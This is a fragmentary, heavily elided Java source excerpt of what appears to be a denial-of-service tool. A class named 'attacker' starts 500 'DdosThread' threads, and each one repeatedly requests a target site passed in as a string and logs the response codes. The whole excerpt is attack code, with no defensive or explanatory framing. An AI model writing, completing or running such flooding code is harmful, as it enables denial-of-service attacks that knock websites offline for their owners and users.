...
public class attacker {
    ...
    //public TextView result_ddos;
    private static String ffsite;
    private static int ffg;

    public static void mainn(String fsite) throws Exception {
        for (int i = 0; i < 500; i++) {
    ...
    public static class DdosThread extends Thread {
        ...
        private final String request = ffsite;
        ...
        public void attack() throws Exception {
            ...
            String pubg = this + " " + connection.getResponseCode() + "" + ffg ;
